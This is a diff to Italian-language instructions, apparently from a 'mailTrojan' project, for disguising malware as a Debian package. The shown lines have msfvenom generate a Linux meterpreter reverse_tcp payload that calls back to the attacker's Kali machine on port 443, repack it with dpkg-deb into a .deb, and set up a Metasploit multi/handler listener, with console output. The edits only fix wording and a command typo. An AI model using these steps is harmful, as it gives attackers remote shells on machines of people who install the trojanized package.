@@ -25,7 +25,7 @@ apri la cartella da terminale e lanca il comando "chmod +x /home/kali/scriptHack
 apri la cartella mailTrojan da terminale e lancia "cd usr/bin" e successivamente lancia 
 "sudo msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp  LHOST=<IP MACCHINA KALI> LPORT=443 -b "\x00" -f elf -o malicious"                                                     
 poi lancia "sudo chmod +x malicious"
-ritorna nella cartella mailTrojane lancia "sudo dpkg-deb --build ./mailTrojan  " che ti ricompatterà il file in un formato deb
+ritorna nella cartella dove è presente la cartella mailTrojane lancia "sudo dpkg-deb --build ./mailTrojan  " che ti ricompatterà il file in un formato deb
 
 
 
@@ -70,7 +70,7 @@ msf6 > use exploit/multi/handler
 [*] Using configured payload generic/shell_reverse_tcp                                                                                                                                           
 msf6 exploit(multi/handler) > set PAYLOAD linux/x86/meterpreter/reverse_tcp                                                                                                                      
 PAYLOAD => linux/x86/meterpreter/reverse_tcp                                                                                                                                                     
-msf6 exploit(multi/handler) > set LHOST =<IP MACCHINA KALI>                                                                                                                                          
+msf6 exploit(multi/handler) > set LHOST <IP MACCHINA KALI>                                                                                                                                          
 LHOST => =<IP MACCHINA KALI>                                                                                                                                                                         
 msf6 exploit(multi/handler) > set LPORT 443                                                                                                                                                      
 LPORT => 443                     
